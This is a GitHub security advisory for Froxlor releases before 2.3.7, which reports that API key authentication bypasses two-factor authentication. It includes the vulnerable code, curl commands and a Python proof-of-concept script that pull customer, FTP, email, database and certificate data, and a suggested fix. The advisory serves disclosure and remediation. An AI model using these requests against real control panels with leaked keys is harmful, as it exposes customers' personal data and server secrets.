# [H] Froxlor's API Authentication bypasses 2FA Authentication

## Summary
Severity: High
Advisory: GHSA-f9rx-7wf7-jr36
CVE: CVE-2026-52793
CWE: CWE-287
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-06-03
Source: https://github.com/advisories/GHSA-f9rx-7wf7-jr36
Type: github-advisory

## Affected
- Packagist: `froxlor/froxlor` — affected >=0 <2.3.7

## Details
## Summary

Froxlor's API authentication (`FroxlorRPC::validateAuth`) does not enforce Two-Factor Authentication. When a user (admin or customer) enables 2FA on their account, the web UI correctly requires a TOTP code after password verification. However, the API accepts requests authenticated with only an API key and secret — no TOTP challenge is issued, checked, or required.

An attacker who obtains a leaked API key+secret for a 2FA-protected account has full access to all API operations without providing a second factor.

## Affected Code

**Web UI — 2FA enforced** (`index.php:82-149`):

```php
if ($result['type_2fa'] != 0) {
    // Redirects to 2FA input page
    // Calls FroxlorTwoFactorAuth::verifyCode()
    // Login is NOT completed without valid TOTP code
}
```

**API — 2FA absent** (`lib/Froxlor/Api/FroxlorRPC.php:75-105`):

```php
private static function validateAuth(string $key, string $secret): bool
{
    $sel_stmt = Database::prepare("
        SELECT ak.*, a.api_allowed as admin_api_allowed,
               c.api_allowed as cust_api_allowed, c.deactivated
        FROM `api_keys` ak
        LEFT JOIN `panel_admins` a ON a.adminid = ak.adminid
        LEFT JOIN `panel_customers` c ON c.customerid = ak.customerid
        WHERE `apikey` = :ak AND `secret` = :as
    ");
    $result = Database::pexecute_first($sel_stmt, ['ak' => $key, 'as' => $secret]);
    if ($result) {
        if ($result['apikey'] == $key && $result['secret'] == $secret
            && ($result['valid_until'] == -1 || $result['valid_until'] >= time())
            && (($result['customerid'] == 0 && $result['admin_api_allowed'] == 1)
                || ($result['customerid'] > 0 && $result['cust_api_allowed'] == 1
                    && $result['deactivated'] == 0))) {
            // Checks: key match, secret match, not expired, API allowed, not deactivated
            // Missing: ANY check for type_2fa, TOTP verification, or 2FA status
            return true;
        }
    }
    throw new Exception('Invalid authorization credentials', 403);
}
```

There are zero references to 2FA, TOTP, `type_2fa`, or `FroxlorTwoFactorAuth` in the entire `lib/Froxlor/Api/` directory:

```bash
$ grep -rn '2fa\|totp\|two.factor\|FroxlorTwoFactor' lib/Froxlor/Api/
# (no output)
```

## PoC

### Environment

- Froxlor 2.3.5, clean Docker install (Debian Bookworm, PHP 8.2, Apache 2.4)
- API enabled (`api.enabled=1`)
- Admin account has 2FA enabled (`type_2fa=1`, TOTP configured)
- Admin has an API key

### Step 1: Confirm 2FA blocks web UI login

```
POST /index.php HTTP/1.1
Host: panel.example.com
Content-Type: application/x-www-form-urlencoded

loginname=admin&password=Admin123!@#&csrf_token=TOKEN&send=send
```

**Result:** Redirect to `index.php?showmessage=4` — 2FA page. Login is NOT completed. The user cannot access the dashboard without entering a TOTP code.

### Step 2: Authenticate via API — no TOTP required

```bash
curl -s -u "API_KEY:API_SECRET" \
  -H 'Content-Type: application/json' \
  -d '{"command":"Customers.listing","params":{}}' \
  https://panel.example.com/api.php
```

**Result:** HTTP 200 with full customer listing:

```json
{
  "data": {
    "list": [
      {
        "loginname": "testcust",
        "email": "test@froxlor.lab",
        "name": "Test",
        "firstname": "Customer"
      }
    ]
  }
}
```

No TOTP code was provided. No 2FA prompt was returned. Full access granted.

### Step 3: Access additional sensitive resources

All of these succeed without any 2FA challenge:

```bash
# Domains
curl -s -u "KEY:SECRET" -d '{"command":"Domains.listing"}' .../api.php
# FTP accounts (home directories, credentials)
curl -s -u "KEY:SECRET" -d '{"command":"Ftps.listing"}' .../api.php
# Email accounts
curl -s -u "KEY:SECRET" -d '{"command":"Emails.listing"}' .../api.php
# MySQL databases
curl -s -u "KEY:SECRET" -d '{"command":"Mysqls.listing"}' .../api.php
# SSL certificates (private keys)
curl -s -u "KEY:SECRET" -d '{"command":"Certificates.listing"}' .../api.php
# DNS records
curl -s -u "KEY:SECRET" -d '{"command":"DomainZones.listing","params":{"domainname":"example.com"}}' .../api.php
```

165 API functions are accessible, including write operations (`Customers.update`, `Domains.add`, `Ftps.add`, etc.).

### Automated PoC Script

```python
#!/usr/bin/env python3
"""Froxlor <= 2.3.x — 2FA Bypass via API (CWE-287)"""
import json, sys, requests, urllib3
urllib3.disable_warnings()

target, key, secret = sys.argv[1], sys.argv[2], sys.argv[3]

r = requests.post(f"{target}/api.php", auth=(key, secret),
    json={"command": "Customers.listing", "params": {}}, verify=False)
data = r.json()

print(f"HTTP {r.status_code}")
if "data" in data:
    for c in data["data"].get("list", []):
        print(f"  {c['loginname']} | {c['email']}")
    print(f"\n2FA-protected account accessed without TOTP. {len(data['data'].get('list',[]))} customers exposed.")
```

Usage: `python3 poc.py https://panel.example.com API_KEY API_SECRET`

## Impact

When a user enables 2FA, they expect all access to their account requires a second factor. The API completely bypasses this expectation:

- **Customer data**: PII (name, email, address) readable and modifiable
- **Domains**: Full control over domains, subdomains, DNS records
- **Email accounts**: Create, read, delete email accounts and forwarders
- **FTP accounts**: Access home directory paths and credentials
- **MySQL databases**: Full database management
- **SSL certificates**: Read private keys, modify certificate bindings
- **165 API functions**: Including all write operations

API keys can be leaked through database backups, log files, config file exposure (GHSA-34qg-65m4-f23m demonstrated DB credential leaks), or compromised automation scripts. Users who enabled 2FA specifically to protect against credential compromise are not protected.

### Comparison with CVE-2023-3173

CVE-2023-3173 ("2FA Bypass by Brute Force") was accepted as **Critical ($60 bounty)** and fixed by adding rate limiting to 2FA verification. This finding is architecturally different — the API authentication path has no 2FA logic at all. No brute force is needed; the second factor is simply never requested.

## Suggested Fix

Add 2FA verification to `FroxlorRPC::validateAuth()`. When the authenticated user has `type_2fa != 0`, require a TOTP code as an additional API parameter:

```php
// lib/Froxlor/Api/FroxlorRPC.php, after line 100:
// Check 2FA if enabled for this user
if (!empty($result['adminid'])) {
    $user = Database::pexecute_first(
        Database::prepare("SELECT type_2fa, data_2fa FROM panel_admins WHERE adminid = :id"),
        ['id' => $result['adminid']]
    );
} else {
    $user = Database::pexecute_first(
        Database::prepare("SELECT type_2fa, data_2fa FROM panel_customers WHERE customerid = :id"),
        ['id' => $result['customerid']]
    );
}
if ($user && $user['type_2fa'] != 0) {
    // Require X-2FA-Code header or 'totp_code' in request body
    $totp_code = $_SERVER['HTTP_X_2FA_CODE'] ?? null;
    if (empty($totp_code)) {
        throw new Exception('2FA code required', 401);
    }
    $tfa = new FroxlorTwoFactorAuth($user['data_2fa']);
    if (!$tfa->verifyCode($totp_code)) {
        throw new Exception('Invalid 2FA code', 403);
    }
}
```

Alternatively, disable API key creation for accounts with 2FA enabled, or require 2FA re-verification when generating new API keys.

## References
- https://github.com/froxlor/froxlor/security/advisories/GHSA-f9rx-7wf7-jr36
- https://github.com/advisories/GHSA-34qg-65m4-f23m
- https://github.com/froxlor/froxlor
- https://github.com/froxlor/froxlor/releases/tag/2.3.7
